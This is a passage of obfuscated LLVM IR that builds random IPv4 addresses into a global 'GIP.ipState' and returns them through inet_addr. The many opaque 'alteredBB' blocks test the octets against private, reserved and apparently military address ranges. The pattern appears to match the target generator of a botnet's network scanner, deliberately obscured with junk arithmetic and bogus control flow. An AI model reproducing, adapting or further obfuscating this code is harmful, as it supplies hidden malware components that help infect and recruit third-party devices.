  %5007 = srem i32 %5006, 255
  %5008 = trunc i32 %5007 to i8
  store i8 %5008, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %30

; <label>:5009:                                   ; preds = %4994
  %5010 = bitcast [16 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5010, i8 0, i64 16, i32 16, i1 false)
  %5011 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %5012 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5013 = zext i8 %5012 to i32
  %5014 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5015 = zext i8 %5014 to i32
  %5016 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5017 = zext i8 %5016 to i32
  %5018 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %5019 = zext i8 %5018 to i32
  %5020 = call i32 (i8*, i8*, ...) @szprintf(i8* %5011, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.244, i32 0, i32 0), i32 %5013, i32 %5015, i32 %5017, i32 %5019)
  %5021 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %5022 = call i32 @inet_addr(i8* %5021) #3
  ret i32 %5022

originalBBalteredBB:                              ; preds = %originalBB, %0
  %5023 = alloca [16 x i8], align 16
  %5024 = call i32 @rand() #3
  %_ = shl i32 %5024, 223
  %_1 = sub i32 0, %5024
  %gen = add i32 %_1, 223
  %_2 = shl i32 %5024, 223
  %_3 = shl i32 %5024, 223
  %_4 = shl i32 %5024, 223
  %_5 = sub i32 %5024, 223
  %gen6 = mul i32 %_5, 223
  %_7 = sub i32 %5024, 223
  %gen8 = mul i32 %_7, 223
  %_9 = sub i32 %5024, 223
  %gen10 = mul i32 %_9, 223
  %5025 = srem i32 %5024, 223
  %5026 = trunc i32 %5025 to i8
  store i8 %5026, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5027 = call i32 @rand() #3
  %_11 = sub i32 %5027, 255
  %gen12 = mul i32 %_11, 255
  %5028 = srem i32 %5027, 255
  %5029 = trunc i32 %5028 to i8
  store i8 %5029, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5030 = call i32 @rand() #3
  %5031 = srem i32 %5030, 255
  %5032 = trunc i32 %5031 to i8
  store i8 %5032, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5033 = call i32 @rand() #3
  %_13 = sub i32 0, %5033
  %gen14 = add i32 %_13, 255
  %_15 = shl i32 %5033, 255
  %5034 = srem i32 %5033, 255
  %5035 = trunc i32 %5034 to i8
  store i8 %5035, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %originalBB

originalBB16alteredBB:                            ; preds = %originalBB16, %34
  %5036 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5037 = zext i8 %5036 to i32
  %5038 = icmp eq i32 %5037, 0
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %58
  %5039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5040 = zext i8 %5039 to i32
  %5041 = icmp eq i32 %5040, 15
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %82
  %5042 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5043 = zext i8 %5042 to i32
  %5044 = icmp eq i32 %5043, 10
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %106
  %5045 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5046 = zext i8 %5045 to i32
  %5047 = icmp eq i32 %5046, 49
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %138
  %5048 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5049 = zext i8 %5048 to i32
  %5050 = icmp eq i32 %5049, 7
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %162
  %5051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5052 = zext i8 %5051 to i32
  %5053 = icmp eq i32 %5052, 21
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %182
  %5054 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5055 = zext i8 %5054 to i32
  %5056 = icmp eq i32 %5055, 22
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %202
  %5057 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5058 = zext i8 %5057 to i32
  %5059 = icmp eq i32 %5058, 26
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %234
  %5060 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5061 = zext i8 %5060 to i32
  %5062 = icmp eq i32 %5061, 33
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %254
  %5063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5064 = zext i8 %5063 to i32
  %5065 = icmp eq i32 %5064, 55
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %278
  %5066 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5067 = zext i8 %5066 to i32
  %5068 = icmp eq i32 %5067, 215
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %302
  %5069 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5070 = zext i8 %5069 to i32
  %5071 = icmp eq i32 %5070, 168
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %342
  %5072 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5073 = zext i8 %5072 to i32
  %5074 = icmp eq i32 %5073, 98
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %366
  %5075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5076 = zext i8 %5075 to i32
  %5077 = icmp eq i32 %5076, 154
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %402
  %5078 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5079 = zext i8 %5078 to i32
  %5080 = icmp eq i32 %5079, 150
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %430
  %5081 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5082 = zext i8 %5081 to i32
  %5083 = icmp eq i32 %5082, 133
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %462
  %5084 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5085 = zext i8 %5084 to i32
  %5086 = icmp eq i32 %5085, 149
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %506
  %5087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5088 = zext i8 %5087 to i32
  %5089 = icmp eq i32 %5088, 150
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %526
  %5090 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5091 = zext i8 %5090 to i32
  %5092 = icmp eq i32 %5091, 196
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %554
  %5093 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5094 = zext i8 %5093 to i32
  %5095 = icmp eq i32 %5094, 152
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %574
  %5096 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5097 = zext i8 %5096 to i32
  %5098 = icmp eq i32 %5097, 229
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %602
  %5099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5100 = zext i8 %5099 to i32
  %5101 = icmp eq i32 %5100, 157
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %626
  %5102 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5103 = zext i8 %5102 to i32
  %5104 = icmp eq i32 %5103, 161
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %650
  %5105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5106 = zext i8 %5105 to i32
  %5107 = icmp eq i32 %5106, 162
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %726
  %5108 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5109 = zext i8 %5108 to i32
  %5110 = icmp eq i32 %5109, 44
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %762
  %5111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5112 = zext i8 %5111 to i32
  %5113 = icmp eq i32 %5112, 168
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %782
  %5114 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5115 = zext i8 %5114 to i32
  %5116 = icmp eq i32 %5115, 102
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %802
  %5117 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5118 = zext i8 %5117 to i32
  %5119 = icmp eq i32 %5118, 203
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %826
  %5120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5121 = zext i8 %5120 to i32
  %5122 = icmp eq i32 %5121, 204
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %846
  %5123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5124 = zext i8 %5123 to i32
  %5125 = icmp eq i32 %5124, 34
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %870
  %5126 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5127 = zext i8 %5126 to i32
  %5128 = icmp eq i32 %5127, 30
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %902
  %5129 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5130 = zext i8 %5129 to i32
  %5131 = icmp eq i32 %5130, 56
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %922
  %5132 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5133 = zext i8 %5132 to i32
  %5134 = icmp eq i32 %5133, 80
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %942
  %5135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5136 = zext i8 %5135 to i32
  %5137 = icmp eq i32 %5136, 235
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %982
  %5138 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5139 = zext i8 %5138 to i32
  %5140 = icmp eq i32 %5139, 70
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %1002
  %5141 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5142 = zext i8 %5141 to i32
  %5143 = icmp eq i32 %5142, 172
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %1026
  %5144 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5145 = zext i8 %5144 to i32
  %5146 = icmp slt i32 %5145, 32
  br label %originalBB160

originalBB164alteredBB:                           ; preds = %originalBB164, %1050
  %5147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5148 = zext i8 %5147 to i32
  %5149 = icmp sge i32 %5148, 64
  br label %originalBB164

originalBB168alteredBB:                           ; preds = %originalBB168, %1074
  %5150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5151 = zext i8 %5150 to i32
  %5152 = icmp eq i32 %5151, 169
  br label %originalBB168

originalBB172alteredBB:                           ; preds = %originalBB172, %1154
  %5153 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5154 = zext i8 %5153 to i32
  %5155 = icmp slt i32 %5154, 168
  br label %originalBB172

originalBB176alteredBB:                           ; preds = %originalBB176, %1174
  %5156 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5157 = zext i8 %5156 to i32
  %5158 = icmp eq i32 %5157, 131
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %1194
  %5159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5160 = zext i8 %5159 to i32
  %5161 = icmp sge i32 %5160, 3
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %1214
  %5162 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5163 = zext i8 %5162 to i32
  %5164 = icmp slt i32 %5163, 251
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %1238
  %5165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5166 = zext i8 %5165 to i32
  %5167 = icmp sge i32 %5166, 3
  br label %originalBB188

originalBB192alteredBB:                           ; preds = %originalBB192, %1262
  %5168 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5169 = zext i8 %5168 to i32
  %5170 = icmp eq i32 %5169, 134
  br label %originalBB192

originalBB196alteredBB:                           ; preds = %originalBB196, %1290
  %5171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5172 = zext i8 %5171 to i32
  %5173 = icmp eq i32 %5172, 136
  br label %originalBB196

originalBB200alteredBB:                           ; preds = %originalBB200, %1318
  %5174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5175 = zext i8 %5174 to i32
  %5176 = icmp eq i32 %5175, 138
  br label %originalBB200

originalBB204alteredBB:                           ; preds = %originalBB204, %1338
  %5177 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5178 = zext i8 %5177 to i32
  %5179 = icmp sge i32 %5178, 13
  br label %originalBB204

originalBB208alteredBB:                           ; preds = %originalBB208, %1358
  %5180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5181 = zext i8 %5180 to i32
  %5182 = icmp slt i32 %5181, 194
  br label %originalBB208

originalBB212alteredBB:                           ; preds = %originalBB212, %1394
  %5183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5184 = zext i8 %5183 to i32
  %5185 = icmp sge i32 %5184, 1
  br label %originalBB212

originalBB216alteredBB:                           ; preds = %originalBB216, %1430
  %5186 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5187 = zext i8 %5186 to i32
  %5188 = icmp eq i32 %5187, 144
  br label %originalBB216

originalBB220alteredBB:                           ; preds = %originalBB220, %1454
  %5189 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5190 = zext i8 %5189 to i32
  %5191 = icmp slt i32 %5190, 253
  br label %originalBB220

originalBB224alteredBB:                           ; preds = %originalBB224, %1474
  %5192 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5193 = zext i8 %5192 to i32
  %5194 = icmp eq i32 %5193, 146
  br label %originalBB224

originalBB228alteredBB:                           ; preds = %originalBB228, %1502
  %5195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5196 = zext i8 %5195 to i32
  %5197 = icmp eq i32 %5196, 147
  br label %originalBB228

originalBB232alteredBB:                           ; preds = %originalBB232, %1522
  %5198 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5199 = zext i8 %5198 to i32
  %5200 = icmp sge i32 %5199, 35
  br label %originalBB232

originalBB236alteredBB:                           ; preds = %originalBB236, %1554
  %5201 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5202 = zext i8 %5201 to i32
  %5203 = icmp slt i32 %5202, 105
  br label %originalBB236

originalBB240alteredBB:                           ; preds = %originalBB240, %1578
  %5204 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5205 = zext i8 %5204 to i32
  %5206 = icmp sge i32 %5205, 168
  br label %originalBB240

originalBB244alteredBB:                           ; preds = %originalBB244, %1598
  %5207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5208 = zext i8 %5207 to i32
  %5209 = icmp slt i32 %5208, 170
  br label %originalBB244

originalBB248alteredBB:                           ; preds = %originalBB248, %1622
  %5210 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5211 = zext i8 %5210 to i32
  %5212 = icmp sge i32 %5211, 198
  br label %originalBB248

originalBB252alteredBB:                           ; preds = %originalBB252, %1650
  %5213 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5214 = zext i8 %5213 to i32
  %5215 = icmp sge i32 %5214, 238
  br label %originalBB252

originalBB256alteredBB:                           ; preds = %originalBB256, %1682
  %5216 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5217 = zext i8 %5216 to i32
  %5218 = icmp slt i32 %5217, 115
  br label %originalBB256

originalBB260alteredBB:                           ; preds = %originalBB260, %1702
  %5219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5220 = zext i8 %5219 to i32
  %5221 = icmp eq i32 %5220, 152
  br label %originalBB260

originalBB264alteredBB:                           ; preds = %originalBB264, %1730
  %5222 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5223 = zext i8 %5222 to i32
  %5224 = icmp eq i32 %5223, 153
  br label %originalBB264

originalBB268alteredBB:                           ; preds = %originalBB268, %1750
  %5225 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5226 = zext i8 %5225 to i32
  %5227 = icmp sge i32 %5226, 21
  br label %originalBB268

originalBB272alteredBB:                           ; preds = %originalBB272, %1774
  %5228 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5229 = zext i8 %5228 to i32
  %5230 = icmp eq i32 %5229, 155
  br label %originalBB272

originalBB276alteredBB:                           ; preds = %originalBB276, %1806
  %5231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5232 = zext i8 %5231 to i32
  %5233 = icmp sge i32 %5232, 74
  br label %originalBB276

originalBB280alteredBB:                           ; preds = %originalBB280, %1834
  %5234 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5235 = zext i8 %5234 to i32
  %5236 = icmp sge i32 %5235, 213
  br label %originalBB280

originalBB284alteredBB:                           ; preds = %originalBB284, %1854
  %5237 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5238 = zext i8 %5237 to i32
  %5239 = icmp slt i32 %5238, 222
  br label %originalBB284

originalBB288alteredBB:                           ; preds = %originalBB288, %1902
  %5240 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5241 = zext i8 %5240 to i32
  %5242 = icmp sge i32 %5241, 235
  br label %originalBB288

originalBB292alteredBB:                           ; preds = %originalBB292, %2022
  %5243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5244 = zext i8 %5243 to i32
  %5245 = icmp eq i32 %5244, 199
  br label %originalBB292

originalBB296alteredBB:                           ; preds = %originalBB296, %2070
  %5246 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5247 = zext i8 %5246 to i32
  %5248 = icmp slt i32 %5247, 62
  br label %originalBB296

originalBB300alteredBB:                           ; preds = %originalBB300, %2114
  %5249 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5250 = zext i8 %5249 to i32
  %5251 = icmp eq i32 %5250, 226
  br label %originalBB300

originalBB304alteredBB:                           ; preds = %originalBB304, %2134
  %5252 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5253 = zext i8 %5252 to i32
  %5254 = icmp eq i32 %5253, 159
  br label %originalBB304

originalBB308alteredBB:                           ; preds = %originalBB308, %2158
  %5255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5256 = zext i8 %5255 to i32
  %5257 = icmp eq i32 %5256, 162
  br label %originalBB308

originalBB312alteredBB:                           ; preds = %originalBB312, %2182
  %5258 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5259 = zext i8 %5258 to i32
  %5260 = icmp eq i32 %5259, 45
  br label %originalBB312

originalBB316alteredBB:                           ; preds = %originalBB316, %2250
  %5261 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5262 = zext i8 %5261 to i32
  %5263 = icmp eq i32 %5262, 68
  br label %originalBB316

originalBB320alteredBB:                           ; preds = %originalBB320, %2274
  %5264 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5265 = zext i8 %5264 to i32
  %5266 = icmp eq i32 %5265, 59
  br label %originalBB320

originalBB324alteredBB:                           ; preds = %originalBB324, %2306
  %5267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5268 = zext i8 %5267 to i32
  %5269 = icmp slt i32 %5268, 191
  br label %originalBB324

originalBB328alteredBB:                           ; preds = %originalBB328, %2338
  %5270 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5271 = zext i8 %5270 to i32
  %5272 = icmp slt i32 %5271, 11
  br label %originalBB328

originalBB332alteredBB:                           ; preds = %originalBB332, %2382
  %5273 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5274 = zext i8 %5273 to i32
  %5275 = icmp sge i32 %5274, 128
  br label %originalBB332

originalBB336alteredBB:                           ; preds = %originalBB336, %2406
  %5276 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5277 = zext i8 %5276 to i32
  %5278 = icmp eq i32 %5277, 198
  br label %originalBB336

originalBB340alteredBB:                           ; preds = %originalBB340, %2442
  %5279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5280 = zext i8 %5279 to i32
  %5281 = icmp eq i32 %5280, 211
  br label %originalBB340

originalBB344alteredBB:                           ; preds = %originalBB344, %2502
  %5282 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5283 = zext i8 %5282 to i32
  %5284 = icmp eq i32 %5283, 67
  br label %originalBB344

originalBB348alteredBB:                           ; preds = %originalBB348, %2526
  %5285 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5286 = zext i8 %5285 to i32
  %5287 = icmp sge i32 %5286, 64
  br label %originalBB348

originalBB352alteredBB:                           ; preds = %originalBB352, %2546
  %5288 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5289 = zext i8 %5288 to i32
  %5290 = icmp slt i32 %5289, 95
  br label %originalBB352

originalBB356alteredBB:                           ; preds = %originalBB356, %2582
  %5291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5292 = zext i8 %5291 to i32
  %5293 = icmp eq i32 %5292, 80
  br label %originalBB356

originalBB360alteredBB:                           ; preds = %originalBB360, %2606
  %5294 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5295 = zext i8 %5294 to i32
  %5296 = icmp sge i32 %5295, 128
  br label %originalBB360

originalBB364alteredBB:                           ; preds = %originalBB364, %2630
  %5297 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5298 = zext i8 %5297 to i32
  %5299 = icmp eq i32 %5298, 82
  br label %originalBB364

originalBB368alteredBB:                           ; preds = %originalBB368, %2654
  %5300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5301 = zext i8 %5300 to i32
  %5302 = icmp sge i32 %5301, 1
  br label %originalBB368

originalBB372alteredBB:                           ; preds = %originalBB372, %2674
  %5303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5304 = zext i8 %5303 to i32
  %5305 = icmp slt i32 %5304, 15
  br label %originalBB372

originalBB376alteredBB:                           ; preds = %originalBB376, %2694
  %5306 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5307 = zext i8 %5306 to i32
  %5308 = icmp eq i32 %5307, 95
  br label %originalBB376

originalBB380alteredBB:                           ; preds = %originalBB380, %2714
  %5309 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5310 = zext i8 %5309 to i32
  %5311 = icmp eq i32 %5310, 85
  br label %originalBB380

originalBB384alteredBB:                           ; preds = %originalBB384, %2750
  %5312 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5313 = zext i8 %5312 to i32
  %5314 = icmp sge i32 %5313, 32
  br label %originalBB384

originalBB388alteredBB:                           ; preds = %originalBB388, %2770
  %5315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5316 = zext i8 %5315 to i32
  %5317 = icmp slt i32 %5316, 43
  br label %originalBB388

originalBB392alteredBB:                           ; preds = %originalBB392, %2790
  %5318 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5319 = zext i8 %5318 to i32
  %5320 = icmp eq i32 %5319, 185
  br label %originalBB392

originalBB396alteredBB:                           ; preds = %originalBB396, %2814
  %5321 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5322 = zext i8 %5321 to i32
  %5323 = icmp sge i32 %5322, 220
  br label %originalBB396

